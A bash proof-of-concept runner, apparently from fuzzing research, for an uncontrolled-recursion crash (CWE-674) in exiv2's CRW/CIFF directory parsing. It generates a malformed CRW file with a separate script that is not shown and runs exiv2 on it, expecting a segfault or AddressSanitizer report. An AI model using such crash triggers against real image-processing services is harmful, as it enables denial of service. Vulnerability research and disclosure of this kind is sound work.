#!/bin/bash
# PoC runner for VULN-001: Uncontrolled Recursion in CIFF Directory Parsing (exiv2)
# Trigger: exiv2 pr <crafted_crw_file>

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="/data/ylwang/non-textfuzz/target/exiv2/build_test/bin/exiv2"
INPUT="${SCRIPT_DIR}/vuln_001_input.crw"
GENERATOR="${SCRIPT_DIR}/vuln_001_gen.py"

echo "[*] VULN-001 PoC: Uncontrolled Recursion in CIFF Directory Parsing"
echo "[*] CVE category: CWE-674 (Uncontrolled Recursion)"
echo "[*] Binary: ${BINARY}"
echo ""

# Step 1: Generate the malformed CRW file
echo "[*] Generating input file..."
python3 "${GENERATOR}"
echo ""

# Step 2: Check input was created
if [ ! -f "${INPUT}" ]; then
    echo "[-] ERROR: Input file not generated"
    exit 1
fi
echo "[*] Input file: ${INPUT} ($(wc -c < "${INPUT}") bytes)"
echo ""

# Step 3: Run the binary
echo "[*] Running: ${BINARY} pr ${INPUT}"
echo "[*] Expected: SIGSEGV or AddressSanitizer stack-buffer-overflow"
echo "---"

# Disable core dumps to avoid filling disk on crash
ulimit -c 0 2>/dev/null || true

# Run with ASAN options to get full report
export ASAN_OPTIONS="detect_stack_use_after_return=0:halt_on_error=1:print_stacktrace=1"

# Use timeout to avoid infinite hang (should crash quickly)
timeout 30 "${BINARY}" pr "${INPUT}" || {
    EXIT_CODE=$?
    echo "---"
    if [ ${EXIT_CODE} -eq 124 ]; then
        echo "[!] Process timed out after 30s (unexpected - should crash)"
    elif [ ${EXIT_CODE} -ne 0 ]; then
        echo "[+] Process exited with code ${EXIT_CODE} (crash/error detected)"
    fi
    exit ${EXIT_CODE}
}

echo "---"
echo "[-] Process completed without crash (vulnerability NOT triggered)"
exit 0
